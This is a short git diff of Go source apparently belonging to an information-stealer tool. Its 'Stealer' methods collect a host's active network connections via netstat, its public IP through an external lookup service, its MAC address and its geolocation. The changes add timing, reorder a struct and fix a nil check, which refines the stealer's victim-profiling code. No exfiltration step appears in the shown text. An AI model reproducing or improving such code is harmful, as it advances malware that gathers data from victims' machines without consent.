@@ -35,13 +35,15 @@ type Connection struct {
 }
 
 type Network struct {
-	Geo                GeoData
 	IP                 string
 	MAC                string
+	Geo                GeoData
 	NetworkConnections []Connection
 }
 
 func (stealer *Stealer) GetNetworkConnections() {
+	defer TimeTrack(time.Now())
+
 	// Executing the netstat command to get list of active network connections on machine
 	out, err := exec.Command("netstat", "-ano").Output()
 	if err != nil {
@@ -76,7 +78,10 @@ func GetIPAddress() string {
 	// Get the systems IPV4 IP Address
 	ipResp, err := http.Get(ipAPI)
 	if err != nil {
-		ipResp.Body.Close()
+		if ipResp != nil {
+			ipResp.Body.Close()
+		}
+
 		return GetIPAddress()
 	}
 	defer ipResp.Body.Close()
@@ -116,6 +121,8 @@ func GetGeolocation(ip string) (string, string, string, string, string) {
 }
 
 func (stealer *Stealer) GetNetworkAddresses() {
+	defer TimeTrack(time.Now())
+
 	// Get the systems IPV4 and MAC Address and related IP geolocation information
 	ipAddress := GetIPAddress()
 
